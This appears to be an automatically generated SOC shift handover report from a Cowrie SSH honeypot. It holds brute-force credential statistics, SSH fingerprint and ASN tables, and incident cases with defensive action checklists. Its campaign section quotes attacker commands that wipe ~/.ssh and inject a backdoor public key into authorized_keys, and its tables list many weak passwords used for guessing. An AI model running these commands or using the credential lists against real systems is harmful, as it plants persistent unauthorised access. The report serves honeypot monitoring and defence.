# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-29 |
| **Generated At** | 2026-08-29T23:59:18Z |
| **Shift Time** | 23:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **310** |
| Confirmed Threats | **270** |
| False Positives Filtered | **40** (12.9%) |
| Unique Attacker IPs | **163** |
| Countries of Origin | **40** |
| High Severity Cases | **175** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **135** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **232** |
| Unique Credential Pairs | **114** |
| Unique Usernames | **26** |
| Unique Passwords | **101** |
| Successful Auth Pairs | **203** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 50 |
| `test` | 38 |
| `support` | 27 |
| `ubuntu` | 25 |
| `345gs5662d34` | 17 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `support` | 8 |
| `55555` | 7 |
| `test555` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `support` | `support` | 8 |
| `root` | `3245gs5662d34` | 7 |
| `test` | `test555` | 6 |
| `guest` | `guest22` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `666666` | `65.20.153.146` | 2026-08-29T18:55:32 |
| `support` | `666666` | `195.222.57.183` | 2026-08-29T18:55:39 |
| `support` | `666666` | `41.178.230.115` | 2026-08-29T18:55:39 |
| `support` | `666666` | `170.233.29.175` | 2026-08-29T18:55:48 |
| `support` | `support` | `176.53.159.196` | 2026-08-29T18:58:00 |
| `test` | `test555` | `112.27.38.203` | 2026-08-29T18:58:07 |
| `ubuntu` | `Maziar123` | `217.60.255.130` | 2026-08-29T18:58:13 |
| `test` | `test555` | `108.234.110.202` | 2026-08-29T18:58:24 |
| `root` | `Admin@123!` | `217.60.255.130` | 2026-08-29T19:05:17 |
| `guest` | `guest22` | `10.0.0.73` | 2026-08-29T19:06:27 |
| `ubuntu` | `P@33w0rd` | `217.60.255.130` | 2026-08-29T19:07:49 |
| `guest` | `guest22` | `202.53.94.242` | 2026-08-29T19:07:58 |
| `guest` | `guest22` | `220.180.166.214` | 2026-08-29T19:08:06 |
| `test` | `test555` | `10.0.0.73` | 2026-08-29T19:08:52 |
| `admin` | `777777` | `10.0.0.73` | 2026-08-29T19:10:04 |
| `root` | `aaa.123` | `217.60.255.130` | 2026-08-29T19:16:23 |
| `ubuntu` | `Yusuf123` | `217.60.255.130` | 2026-08-29T19:17:42 |
| `test123` | `princess` | `213.209.159.230` | 2026-08-29T19:19:46 |
| `guest` | `guest22` | `65.20.251.170` | 2026-08-29T19:23:26 |
| `guest` | `guest22` | `85.164.15.194` | 2026-08-29T19:23:33 |
| `test` | `test555` | `120.238.23.168` | 2026-08-29T19:25:05 |
| `test` | `test555` | `106.245.246.26` | 2026-08-29T19:25:15 |
| `root` | `Passw0rd` | `217.60.255.130` | 2026-08-29T19:27:14 |
| `admin` | `777777` | `182.52.133.240` | 2026-08-29T19:27:16 |
| `ubuntu` | `Alperen123` | `217.60.255.130` | 2026-08-29T19:27:16 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-29T19:27:19 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-29T19:27:19 |
| `admin` | `777777` | `196.188.187.85` | 2026-08-29T19:27:24 |
| `admin` | `777777` | `211.23.109.116` | 2026-08-29T19:27:29 |
| `admin` | `777777` | `111.70.23.236` | 2026-08-29T19:27:38 |
| `root` | `﻿------fuck------` | `95.182.83.99` | 2026-08-29T19:28:13 |
| `support` | `22` | `218.58.73.238` | 2026-08-29T19:30:00 |
| `support` | `22` | `185.40.122.250` | 2026-08-29T19:30:15 |
| `usman` | `usman` | `103.159.54.61` | 2026-08-29T19:35:57 |
| `345gs5662d34` | `345gs5662d34` | `103.159.54.61` | 2026-08-29T19:36:01 |
| `usman` | `3245gs5662d34` | `103.159.54.61` | 2026-08-29T19:36:02 |
| `ubuntu` | `Furkan123` | `217.60.255.130` | 2026-08-29T19:37:04 |
| `root` | `asd123...` | `217.60.255.130` | 2026-08-29T19:38:15 |
| `test` | `test44` | `10.0.0.73` | 2026-08-29T19:38:41 |
| `root` | `debian` | `106.13.114.235` | 2026-08-29T19:38:59 |
| `test` | `test44` | `220.82.247.216` | 2026-08-29T19:40:21 |
| `support` | `22` | `10.0.0.73` | 2026-08-29T19:40:52 |
| `test` | `3` | `10.0.0.73` | 2026-08-29T19:41:40 |
| `w` | `w` | `172.160.227.37` | 2026-08-29T19:45:04 |
| `345gs5662d34` | `345gs5662d34` | `172.160.227.37` | 2026-08-29T19:45:07 |
| `w` | `3245gs5662d34` | `172.160.227.37` | 2026-08-29T19:45:08 |
| `ubuntu` | `Bozkurt2025` | `217.60.255.130` | 2026-08-29T19:46:45 |
| `seekcy` | `Joysuch@Locate2025` | `180.93.172.213` | 2026-08-29T19:47:12 |
| `345gs5662d34` | `345gs5662d34` | `180.93.172.213` | 2026-08-29T19:47:16 |
| `seekcy` | `3245gs5662d34` | `180.93.172.213` | 2026-08-29T19:47:18 |
| `root` | `Admin@786` | `217.60.255.130` | 2026-08-29T19:49:07 |
| `test` | `test44` | `122.187.230.82` | 2026-08-29T19:55:24 |
| `test` | `test44` | `122.170.97.94` | 2026-08-29T19:55:32 |
| `ubuntu` | `Ozturk123` | `217.60.255.130` | 2026-08-29T19:56:22 |
| `support` | `22` | `68.7.114.69` | 2026-08-29T19:56:52 |
| `support` | `22` | `62.122.195.14` | 2026-08-29T19:56:59 |
| `test` | `3` | `117.241.77.78` | 2026-08-29T19:59:07 |
| `test` | `3` | `183.233.85.194` | 2026-08-29T19:59:16 |
| `test` | `3` | `92.251.124.73` | 2026-08-29T19:59:17 |
| `test` | `3` | `61.12.84.172` | 2026-08-29T19:59:29 |
| `root` | `ubuntu123#` | `217.60.255.130` | 2026-08-29T19:59:58 |
| `admin3` | `letmein` | `213.209.159.230` | 2026-08-29T20:02:17 |
| `ubuntu` | `Yunus2025` | `217.60.255.130` | 2026-08-29T20:06:02 |
| `support` | `support` | `10.0.0.73` | 2026-08-29T20:08:23 |
| `admin` | `666` | `10.0.0.73` | 2026-08-29T20:10:50 |
| `root` | `developer@2024` | `217.60.255.130` | 2026-08-29T20:11:01 |
| `admin` | `666` | `60.166.8.174` | 2026-08-29T20:12:22 |
| `admin` | `666` | `45.178.227.0` | 2026-08-29T20:12:35 |
| `root` | `4` | `10.0.0.73` | 2026-08-29T20:12:49 |
| `user` | `00000` | `10.0.0.73` | 2026-08-29T20:13:25 |
| `ubuntu` | `Fuckyou123` | `217.60.255.130` | 2026-08-29T20:15:52 |
| `root` | `---fuck_you----` | `182.92.242.181` | 2026-08-29T20:20:14 |
| `root` | `Micro@2025` | `217.60.255.130` | 2026-08-29T20:21:51 |
| `tv` | `tv` | `10.0.0.73` | 2026-08-29T20:24:52 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-08-29T20:24:56 |
| `tv` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T20:24:58 |
| `ubuntu` | `Password999` | `217.60.255.130` | 2026-08-29T20:25:21 |
| `admin` | `666` | `212.68.38.69` | 2026-08-29T20:27:32 |
| `admin` | `666` | `189.52.52.162` | 2026-08-29T20:27:46 |
| `debian` | `!QAZ1qaz` | `10.0.0.73` | 2026-08-29T20:30:17 |
| `debian` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T20:30:23 |
| `user` | `00000` | `78.155.213.21` | 2026-08-29T20:30:46 |
| `user` | `00000` | `99.121.112.251` | 2026-08-29T20:31:06 |
| `root` | `Test!123` | `217.60.255.130` | 2026-08-29T20:32:43 |
| `test` | `000` | `122.187.237.122` | 2026-08-29T20:34:00 |
| `test` | `000` | `111.70.11.78` | 2026-08-29T20:34:09 |
| `ubuntu` | `ZXCvbn@123` | `217.60.255.130` | 2026-08-29T20:35:01 |
| `test` | `0000` | `10.0.0.73` | 2026-08-29T20:42:53 |
| `root` | `ASDF@1234` | `217.60.255.130` | 2026-08-29T20:43:44 |
| `ubuntu` | `Zaqwsx123` | `217.60.255.130` | 2026-08-29T20:44:45 |
| `netadmin` | `qazwsx` | `213.209.159.230` | 2026-08-29T20:44:45 |
| `test` | `000` | `10.0.0.73` | 2026-08-29T20:45:02 |
| `ubuntu` | `QAZxsw@123` | `217.60.255.130` | 2026-08-29T20:54:23 |
| `root` | `Pass@123` | `217.60.255.130` | 2026-08-29T20:54:36 |
| `test` | `0000` | `61.37.150.6` | 2026-08-29T20:59:31 |
| `test` | `0000` | `222.174.184.86` | 2026-08-29T20:59:41 |
| `test` | `000` | `82.102.149.88` | 2026-08-29T21:01:30 |
| `support` | `444444` | `90.230.168.26` | 2026-08-29T21:02:12 |
| `support` | `444444` | `223.241.214.127` | 2026-08-29T21:02:26 |
| `support` | `444444` | `59.46.182.10` | 2026-08-29T21:02:26 |
| `support` | `444444` | `46.77.69.201` | 2026-08-29T21:02:39 |
| `ubuntu` | `Salam@123` | `217.60.255.130` | 2026-08-29T21:03:51 |
| `root` | `admin123.` | `217.60.255.130` | 2026-08-29T21:05:20 |
| `ubnt` | `77777` | `182.95.186.182` | 2026-08-29T21:06:26 |
| `ubnt` | `77777` | `42.125.196.116` | 2026-08-29T21:06:34 |
| `ubuntu` | `Salehi@123` | `217.60.255.130` | 2026-08-29T21:13:31 |
| `test` | `999999` | `10.0.0.73` | 2026-08-29T21:14:37 |
| `root` | `Linux@123` | `217.60.255.130` | 2026-08-29T21:15:59 |
| `test` | `999999` | `199.7.163.33` | 2026-08-29T21:16:09 |
| `test` | `999999` | `121.189.226.81` | 2026-08-29T21:16:21 |
| `ubnt` | `77777` | `10.0.0.73` | 2026-08-29T21:17:26 |
| `ubuntu` | `Matin123` | `217.60.255.130` | 2026-08-29T21:22:57 |
| `root` | `centos#2024` | `217.60.255.130` | 2026-08-29T21:26:48 |
| `nginx` | `jessica` | `213.209.159.230` | 2026-08-29T21:27:17 |
| `test` | `999999` | `63.135.169.175` | 2026-08-29T21:31:29 |
| `test` | `999999` | `97.211.176.59` | 2026-08-29T21:31:38 |
| `ubuntu` | `Test@123456` | `217.60.255.130` | 2026-08-29T21:32:32 |
| `ubnt` | `77777` | `47.247.73.99` | 2026-08-29T21:33:42 |
| `ubnt` | `77777` | `68.7.114.69` | 2026-08-29T21:33:50 |
| `admin` | `55555` | `113.108.144.34` | 2026-08-29T21:34:01 |
| `admin` | `55555` | `186.238.242.194` | 2026-08-29T21:34:09 |
| `root` | `India@1234` | `217.60.255.130` | 2026-08-29T21:37:40 |
| `default` | `default333` | `182.156.35.238` | 2026-08-29T21:38:47 |
| `default` | `default333` | `125.36.68.227` | 2026-08-29T21:38:56 |
| `root` | `admin` | `36.89.252.58` | 2026-08-29T21:40:55 |
| `ubuntu` | `Pass@1234!` | `217.60.255.130` | 2026-08-29T21:42:04 |
| `support` | `333333` | `10.0.0.73` | 2026-08-29T21:46:35 |
| `support` | `333333` | `118.183.180.108` | 2026-08-29T21:48:04 |
| `support` | `333333` | `112.25.140.211` | 2026-08-29T21:48:13 |
| `root` | `test123` | `217.60.255.130` | 2026-08-29T21:48:15 |
| `guest` | `guest333` | `10.0.0.73` | 2026-08-29T21:48:32 |
| `default` | `default333` | `10.0.0.73` | 2026-08-29T21:49:40 |
| `ubuntu` | `Fara@123` | `217.60.255.130` | 2026-08-29T21:51:29 |
| `root` | `123@admin` | `217.60.255.130` | 2026-08-29T21:59:04 |
| `ubuntu` | `123QWEqwe!` | `217.60.255.130` | 2026-08-29T22:01:16 |
| `support` | `333333` | `202.154.15.177` | 2026-08-29T22:03:22 |
| `guest` | `guest333` | `117.248.201.39` | 2026-08-29T22:05:41 |
| `default` | `default333` | `211.107.130.203` | 2026-08-29T22:05:47 |
| `guest` | `guest333` | `64.53.7.231` | 2026-08-29T22:05:48 |
| `guest` | `guest333` | `103.7.60.253` | 2026-08-29T22:05:48 |
| `default` | `default333` | `186.238.89.142` | 2026-08-29T22:05:55 |
| `root` | `a123456b` | `171.25.158.74` | 2026-08-29T22:07:44 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.74` | 2026-08-29T22:07:47 |
| `root` | `3245gs5662d34` | `171.25.158.74` | 2026-08-29T22:07:48 |
| `admin` | `admin` | `188.166.239.236` | 2026-08-29T22:08:35 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-29T22:08:36 |
| `api` | `azerty` | `213.209.159.230` | 2026-08-29T22:09:39 |
| `root` | `a123456b` | `51.77.213.203` | 2026-08-29T22:09:46 |
| `345gs5662d34` | `345gs5662d34` | `51.77.213.203` | 2026-08-29T22:09:48 |
| `root` | `3245gs5662d34` | `51.77.213.203` | 2026-08-29T22:09:49 |
| `tallerv` | `tallerv` | `154.83.196.237` | 2026-08-29T22:10:34 |
| `345gs5662d34` | `345gs5662d34` | `154.83.196.237` | 2026-08-29T22:10:37 |
| `tallerv` | `3245gs5662d34` | `154.83.196.237` | 2026-08-29T22:10:38 |
| `root` | `Cisco@123` | `217.60.255.130` | 2026-08-29T22:10:40 |
| `test` | `55555` | `113.193.187.154` | 2026-08-29T22:10:53 |
| `ubuntu` | `google.com` | `217.60.255.130` | 2026-08-29T22:11:24 |
| `elasticsearch` | `es` | `36.64.131.68` | 2026-08-29T22:11:25 |
| `vincenzo` | `vincenzo` | `104.199.176.250` | 2026-08-29T22:11:28 |
| `345gs5662d34` | `345gs5662d34` | `36.64.131.68` | 2026-08-29T22:11:30 |
| `345gs5662d34` | `345gs5662d34` | `104.199.176.250` | 2026-08-29T22:11:31 |
| `elasticsearch` | `3245gs5662d34` | `36.64.131.68` | 2026-08-29T22:11:32 |
| `vincenzo` | `3245gs5662d34` | `104.199.176.250` | 2026-08-29T22:11:32 |
| `root` | `Qq123321` | `10.0.0.73` | 2026-08-29T22:11:52 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T22:11:53 |
| `root` | `Root2026!!` | `10.0.0.73` | 2026-08-29T22:13:07 |
| `test` | `abc123` | `10.0.0.73` | 2026-08-29T22:13:16 |
| `test` | `3245gs5662d34` | `10.0.0.73` | 2026-08-29T22:13:21 |
| `ubnt` | `8888888` | `10.0.0.73` | 2026-08-29T22:18:24 |
| `root` | `Ft112233` | `49.207.241.187` | 2026-08-29T22:19:26 |
| `345gs5662d34` | `345gs5662d34` | `49.207.241.187` | 2026-08-29T22:19:29 |
| `root` | `3245gs5662d34` | `49.207.241.187` | 2026-08-29T22:19:31 |
| `ubnt` | `8888888` | `116.114.84.246` | 2026-08-29T22:19:57 |
| `ubnt` | `8888888` | `62.201.212.54` | 2026-08-29T22:20:04 |
| `root` | `8` | `10.0.0.73` | 2026-08-29T22:20:11 |
| `ubuntu` | `Admin@1234!` | `217.60.255.130` | 2026-08-29T22:21:27 |
| `test` | `55555` | `10.0.0.73` | 2026-08-29T22:21:46 |
| `root` | `1234Asdf` | `103.146.159.173` | 2026-08-29T22:21:52 |
| `345gs5662d34` | `345gs5662d34` | `103.146.159.173` | 2026-08-29T22:21:55 |
| `root` | `3245gs5662d34` | `103.146.159.173` | 2026-08-29T22:21:57 |
| `root` | `asdfghjkl` | `217.60.255.130` | 2026-08-29T22:21:58 |
| `sshadmin` | `sshadmin` | `155.94.155.107` | 2026-08-29T22:23:37 |
| `345gs5662d34` | `345gs5662d34` | `155.94.155.107` | 2026-08-29T22:23:39 |
| `sshadmin` | `3245gs5662d34` | `155.94.155.107` | 2026-08-29T22:23:39 |
| `root` | `Support@2023` | `54.36.99.29` | 2026-08-29T22:26:09 |
| `345gs5662d34` | `345gs5662d34` | `54.36.99.29` | 2026-08-29T22:26:11 |
| `root` | `3245gs5662d34` | `54.36.99.29` | 2026-08-29T22:26:12 |
| `ubuntu` | `Mail@123` | `217.60.255.130` | 2026-08-29T22:31:31 |
| `root` | `asdf` | `217.60.255.130` | 2026-08-29T22:33:20 |
| `ubnt` | `8888888` | `108.234.110.202` | 2026-08-29T22:35:10 |
| `root` | `8` | `117.211.15.106` | 2026-08-29T22:37:35 |
| `root` | `8` | `180.193.181.195` | 2026-08-29T22:37:46 |
| `test` | `55555` | `106.89.51.153` | 2026-08-29T22:37:53 |
| `test` | `55555` | `147.15.110.51` | 2026-08-29T22:38:03 |
| `ubuntu` | `Ma@123` | `217.60.255.130` | 2026-08-29T22:41:27 |
| `user` | `user77` | `222.117.176.58` | 2026-08-29T22:42:54 |
| `user` | `user77` | `111.70.32.11` | 2026-08-29T22:43:02 |
| `root` | `admin!23` | `217.60.255.130` | 2026-08-29T22:44:12 |
| `operator` | `operator2019` | `10.0.0.73` | 2026-08-29T22:50:18 |
| `ubuntu` | `Qq@123456` | `217.60.255.130` | 2026-08-29T22:50:54 |
| `ubnt` | `444444` | `10.0.0.73` | 2026-08-29T22:51:39 |
| `operator` | `operator2019` | `122.170.96.105` | 2026-08-29T22:51:47 |
| `user` | `user77` | `10.0.0.73` | 2026-08-29T22:53:36 |
| `dba` | `summer` | `213.209.159.230` | 2026-08-29T22:54:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **310** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 102 |
| OpenSSH | 74 |
| Go SSH scanner | 21 |
| Paramiko (Python) | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 74 | 72 |
| `419da4c91ddb...` | Modern SSH client | 46 | 1 |
| `f555226df196...` | Mirai/variant | 34 | 12 |
| `16443846184e...` | Generic scanner | 8 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 74 | 72 | Mirai/variant |
| `419da4c91ddb...` | libssh | 46 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 34 | 12 | Mirai/variant |
| `95420f9d932d...` | libssh | 17 | 7 | — |
| `16443846184e...` | Go SSH scanner | 8 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.146.159.173`, `49.207.241.187`, `172.160.227.37`, `36.64.131.68`, `155.94.155.107`, `54.36.99.29`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **163** |
| Unique ASNs | **103** |
| High-Risk ASNs | **91** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 9 | HIGH |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS17421` | Mobile Business Group | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (174)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-afe1b17e577c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.153[.]146` |
| **First Seen** | 2026-08-29 18:55 |
| **Last Seen** | 2026-08-29 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:55:30` | `cowrie.session.connect` |
| `2026-08-29 18:55:31` | `cowrie.client.version` |
| `2026-08-29 18:55:31` | `cowrie.client.kex` |
| `2026-08-29 18:55:32` | `cowrie.login.success` |
| `2026-08-29 18:55:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.153[.]146` to AbuseIPDB if not already reported
- [ ] Block `65.20.153[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abd3e4bc3d2

| Field | Detail |
|---|---|
| **Source IP** | `41.178.230[.]115` |
| **First Seen** | 2026-08-29 18:55 |
| **Last Seen** | 2026-08-29 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:55:37` | `cowrie.session.connect` |
| `2026-08-29 18:55:38` | `cowrie.client.version` |
| `2026-08-29 18:55:38` | `cowrie.client.kex` |
| `2026-08-29 18:55:39` | `cowrie.login.success` |
| `2026-08-29 18:55:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.178.230[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.178.230[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7b3986eab8

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-08-29 18:55 |
| **Last Seen** | 2026-08-29 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:55:38` | `cowrie.session.connect` |
| `2026-08-29 18:55:38` | `cowrie.client.version` |
| `2026-08-29 18:55:38` | `cowrie.client.kex` |
| `2026-08-29 18:55:39` | `cowrie.login.success` |
| `2026-08-29 18:55:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a57574c852

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]175` |
| **First Seen** | 2026-08-29 18:55 |
| **Last Seen** | 2026-08-29 18:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:55:45` | `cowrie.session.connect` |
| `2026-08-29 18:55:46` | `cowrie.client.version` |
| `2026-08-29 18:55:46` | `cowrie.client.kex` |
| `2026-08-29 18:55:48` | `cowrie.login.success` |
| `2026-08-29 18:55:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]175` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5b36d64293

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 18:57 |
| **Last Seen** | 2026-08-29 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:57:59` | `cowrie.session.connect` |
| `2026-08-29 18:57:59` | `cowrie.client.version` |
| `2026-08-29 18:58:00` | `cowrie.client.kex` |
| `2026-08-29 18:58:00` | `cowrie.login.success` |
| `2026-08-29 18:58:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:58:00` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2edf8ba790

| Field | Detail |
|---|---|
| **Source IP** | `112.27.38[.]203` |
| **First Seen** | 2026-08-29 18:58 |
| **Last Seen** | 2026-08-29 18:58 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:58:02` | `cowrie.session.connect` |
| `2026-08-29 18:58:04` | `cowrie.client.version` |
| `2026-08-29 18:58:04` | `cowrie.client.kex` |
| `2026-08-29 18:58:07` | `cowrie.login.success` |
| `2026-08-29 18:58:09` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.27.38[.]203` to AbuseIPDB if not already reported
- [ ] Block `112.27.38[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b7814709ca

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:58 |
| **Last Seen** | 2026-08-29 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:58:11` | `cowrie.session.connect` |
| `2026-08-29 18:58:11` | `cowrie.client.version` |
| `2026-08-29 18:58:12` | `cowrie.client.kex` |
| `2026-08-29 18:58:13` | `cowrie.login.success` |
| `2026-08-29 18:58:13` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:58:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:58:13` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

